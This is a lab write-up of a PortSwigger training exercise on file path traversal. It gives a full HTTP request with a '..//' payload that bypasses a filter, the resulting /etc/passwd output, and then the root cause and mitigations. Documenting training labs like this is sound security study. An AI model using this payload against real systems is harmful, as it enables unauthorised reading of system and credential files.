# Lab Report: File Path Traversal (Simple Case)

## Overview
This lab demonstrates a **File Path Traversal** vulnerability where user-supplied file path input is used to read files from the filesystem without proper validation or canonicalization.

The goal of this lab was to retrieve the contents of the `/etc/passwd` file.

---

## Steps to Exploitation

### 1. Initial Request
The application used a request parameter `filename` to fetch image files. Simple relative traversal such as `../../../../etc/passwd` was blocked or filtered.

### 2. Payload
A traversal payload using `..//` segments was used to bypass the filter:

```
GET /image?filename=..//..//../etc/passwd HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<valid-session-cookie>
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,*/*
```

### 3. Server Response
The server returned the contents of `/etc/passwd`, proving successful exploitation:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

---

## Evidence

### Exploit Request and Response
![Exploit Request and Response](/images/path%20traversal,%20simple%20case1.jpg)

### Lab Solved Confirmation
![Lab Solved](/images/path%20traversal,%20simple%20case%20lab%20solved1.jpg)

---

## Result
- Retrieved sensitive system file: `/etc/passwd`  
- Confirmed path traversal vulnerability using `..//` traversal pattern  
- Lab status:  
  ✅ *"Congratulations, you solved the lab!"*

---

## Root Cause
- The application failed to canonicalize and validate file paths properly.  
- The filter did not account for alternate traversal encodings/patterns like `..//`, allowing traversal to succeed.

---

## Mitigation
1. **Use Whitelisting** – Restrict file access to specific directories and predefined filenames.  
2. **Canonicalization** – Normalize and canonicalize paths before validation to remove traversal attempts.  
3. **Avoid Direct File References** – Use indirect references (IDs) instead of filenames in user input.  
4. **Reject/Normalize Alternate Traversals** – Normalize encoded or non-standard traversal sequences before filtering.  
5. **Use Safe APIs** – Use APIs that perform proper path normalization and avoid manual string-based filtering.

---

## Skills Demonstrated
- Testing for path traversal vulnerabilities  
- Bypassing naive filters using alternate traversal patterns (`..//`)  
- Retrieving sensitive files from the server (`/etc/passwd`)  
- Documenting exploitation steps and capturing proof using Burp Suite

---

## References
- PortSwigger Academy: File path traversal, simple case  
- OWASP: Path Traversal

--- 

*End of report.*